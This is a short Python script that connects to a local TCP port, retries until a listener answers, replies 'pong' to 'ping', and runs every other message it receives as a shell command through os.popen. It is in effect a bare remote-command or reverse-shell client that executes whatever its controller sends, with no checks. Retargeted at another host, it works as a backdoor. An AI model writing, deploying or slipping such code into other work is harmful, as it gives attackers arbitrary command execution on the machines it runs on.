import socket
import time
import os

c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

HOST = "127.0.0.1"
PORT = 65535

connected = False

while not connected:
    try:
        c.connect((HOST, PORT))
        connected = True

    except ConnectionRefusedError:
        time.sleep(1)


while True:
    data = c.recv(1024)
    if data:
        data = data.decode()

        if data == "ping":
            c.send("pong".encode())

        else:
            os.popen(data)
